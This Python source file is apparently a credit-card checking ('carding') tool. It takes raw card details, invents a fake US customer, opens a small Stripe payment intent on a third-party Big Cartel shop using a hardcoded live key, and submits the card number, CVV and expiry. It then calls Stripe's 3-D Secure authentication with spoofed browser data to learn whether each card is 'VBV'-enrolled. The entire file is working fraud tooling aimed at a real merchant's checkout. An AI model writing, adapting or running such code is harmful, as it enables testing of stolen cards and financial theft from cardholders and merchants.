from app.core.reqPlus import reqPlus

from app.utils.exceptions import(
    expInvalidRequest,
    expInvalidRequestsResponse,
    invalidCredentials,
    userNotFound,
    captchaWrong,
    expMaxRetries,
    expSpecialTimeOut
)

import urllib

from app.utils.cchelper import(
    formatar_cc,
    fmt_cc,
    luhn,
    gen_gg
)

from app.utils.utils import(
    add_arquivo,
    gibe_random_ua,
    b64decfixpad
)



import json

from app.utils.fakeUSAperson import FakePesonCheckoutAluvii


class stripeVBVEXTERNALbeta1(reqPlus):
    def __init__(
        self,
        proxies={},
        timeout=(10,30)
    ):
        self.client_data = None
        self.client_mail = 'juliettedrunk@fthcapital.com'
        super().__init__(proxies=proxies, timeout=timeout, default_useragent=gibe_random_ua())
    def gen_client(self):
        fake = FakePesonCheckoutAluvii()
        self.client_data = fake
    def gen_stripe_intent(self, cc_raw):
        self.new_session(ua=gibe_random_ua())
        self.gen_client()
        cc_data = formatar_cc(cc_raw)
        if not cc_data:
            print(f'invalid cc info ---- {cc_raw}')
            return False
        url = 'https://api.bigcartel.com/stripe_payment_intents/YX4RO8FHNSTZE26A3VPK3Q5UJ'
        headers = self.gen_headers(
            referer='https://resellerspalace.bigcartel.com/',
            origin='https://resellerspalace.bigcartel.com',
            **{
                'Content-Type': 'application/json'
            }
        )
        payload = {
            'amount': 100,
            'account_id': '10767579',
            'update_address': True,
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                json=payload,
                method='POST'
            )
        except Exception as err:
            print(f'gen_stripe_intent exp --- {err}')
        else:
            if response.status_code == 200:
                payment_id = response.json().get('id', False)
                payment_secret = response.json().get('clientSecret', False)
                if payment_id and payment_secret:
                    response.set_status(True)
                    response.add_extra(
                        {
                            'payment_id': payment_id,
                            'cc_data': cc_data,
                            'payment_secret': payment_secret
                        }
                    )
                    return True
                else:
                    print(f'stripeVBVEXTERNALbeta1.gen_stripe_intent no payment_id')
            else:
                print(f'stripeVBVEXTERNALbeta1.gen_stripe_intent status_code != 200 --- {response.status_code}')
        return False
    def add_payment_method(self):
        response_gen_intent = self.get_request('gen_stripe_intent', True)
        if not response_gen_intent:
            return False
        extra_data = response_gen_intent.get_extra()
        payment_id = extra_data.get('payment_id', False)
        payment_secret = extra_data.get('payment_secret', False)
        cc_data = extra_data.get('cc_data', False)
        if not payment_id or not cc_data or not payment_secret:
            return False
        url = f'https://api.stripe.com/v1/payment_intents/{payment_id}/confirm'
        headers = self.gen_headers(
            referer='https://js.stripe.com/',
            origin='https://js.stripe.com',
            **{
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        payload = {
            "return_url": "https://resellerspalace.bigcartel.com/checkout/YX4RO8FHNSTZE26A3VPK3Q5UJ?checkout_polling_url=https%3A%2F%2Fresellerspalace.bigcartel.com%2Fcheckout%2FYX4RO8FHNSTZE26A3VPK3Q5UJ&stripe_payment_type=link",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc_data.get('cc'),
            "payment_method_data[card][cvc]": cc_data.get('cvv'),
            "payment_method_data[card][exp_year]": cc_data.get('year'),
            "payment_method_data[card][exp_month]": cc_data.get('month'),
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][postal_code]": "94107",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/031faf5c34; stripe-js-v3/031faf5c34; payment-element; deferred-intent; autopm",
            "payment_method_data[referrer]": "https://resellerspalace.bigcartel.com",
            "payment_method_data[time_on_page]": "1731529",
            "payment_method_data[client_attribution_metadata][client_session_id]": "8bdca19a-1e7d-46d6-b291-ed350ca5362c",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[guid]": "3932821d-16e3-4eba-959e-b5ff800a2d4c581a24",
            "payment_method_data[muid]": "e951a25f-6c71-48c0-a261-1e07fcda36322a9c8b",
            "payment_method_data[sid]": "9c76cd30-3ee7-4f4f-adbe-594d56a5434963ed12",
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "client_context[capture_method]": "manual",
            "use_stripe_sdk": False,
            "key": "pk_live_51Oq7PlJfTPyWLEjrkdCuf9N8zXsu3QPDWvicNCvvVOSmUK0Np37aQ3viIhHTlCDs1Uupi9aORoW0cENeQyp6nzso00vhI6xGBK",
            "client_secret": payment_secret
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                data=payload,
                method='POST'
            )
        except Exception as err:
            print(f'add_payment_method exp --- {err}')
        else:
            if response.status_code == 200:
                next_action = response.json().get('next_action', {})
                if next_action:
                    next_action_type = next_action.get('type', False)
                    if next_action_type:
                        url_next = None
                        if next_action_type == 'redirect_to_url':
                            url_next = next_action.get('redirect_to_url', {}).get('url', False)
                        response.set_status(True)
                        response.add_extra(
                            {
                                'next_action_type': next_action_type,
                                'url_next': url_next,
                            }
                        )
                        return True
                    else:
                        print(f'add_payment_method no action type')
                else:
                    print(f'add_payment_method no next action')
            else:
                print(f'add_payment_method status_code != 200 --- {response.status_code}')
        return False
    def url_garimpa(self, url):
        try:
            url_query_parsed = urllib.parse.parse_qsl(urllib.parse.urlparse(url).query)
        except Exception as err:
            print(f'url_garimpa exp --- {url} --- {err}')
        else:
            if url_query_parsed:
                query = {}
                for item in url_query_parsed:
                    query.update(
                        {
                            item[0]: item[1]
                        }
                    )
                return query
        return {}
    def auth_vbv(self):
        response_add_payment = self.get_request('add_payment_method', True)
        if not response_add_payment:
            return False
        extra_data = response_add_payment.get_extra()
        next_action_type = extra_data.get('next_action_type', False)
        url_next = extra_data.get('url_next', False)
        if not url_next:
            return False
        payment_source = self.url_garimpa(url_next).get('source', False)
        if not payment_source:
            return False
        url = f'https://api.stripe.com/v1/3ds2/authenticate'
        headers = self.gen_headers(
            referer='https://js.stripe.com/',
            origin='https://js.stripe.com',
            **{
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        payload = {
            "source": payment_source,
            "browser": "{\"fingerprintAttempted\":true,\"fingerprintData\":null,\"challengeWindowSize\":null,\"threeDSCompInd\":\"Y\",\"browserJavaEnabled\":false,\"browserJavascriptEnabled\":true,\"browserLanguage\":\"en-US\",\"browserColorDepth\":\"24\",\"browserScreenHeight\":\"1080\",\"browserScreenWidth\":\"1920\",\"browserTZ\":\"0\",\"browserUserAgent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"}",
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "false",
            "one_click_authn_device_support[webauthn_eligible]": "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "false",
            "key": "pk_live_51Oq7PlJfTPyWLEjrkdCuf9N8zXsu3QPDWvicNCvvVOSmUK0Np37aQ3viIhHTlCDs1Uupi9aORoW0cENeQyp6nzso00vhI6xGBK"
        }
        try:
            response = self._make_call(
                url=url,
                headers=headers,
                data=payload,
                method='POST'
            )
        except Exception as err:
            print(f'auth_vbv exp --- {err}')
        else:
            if response.status_code == 200:
                response.set_status(True)
                state = response.json().get('state', False)
                ares = response.json().get('ares', {})
                extra = {
                    'state': state
                }
                if ares:
                    extra.update(
                        {
                            'ares': ares
                        }
                    )
                response.add_extra(extra)
                return True
            else:
                print(f'auth_vbv status_code != 200 --- {response.status_code}')
        return False
    def cvbv(self, cc_raw):
        if not self.gen_stripe_intent(cc_raw) == True:
            print(f'failed gen_stripe_intent --- {cc_raw}')
            return False
        if not self.add_payment_method() == True:
            print(f'failed add_payment_method')
            return False
        if not self.auth_vbv() == True:
            print(f'auth vbv != True')
        else:
            print(f'authvbv true !!')
        return self.get_request('auth_vbv')

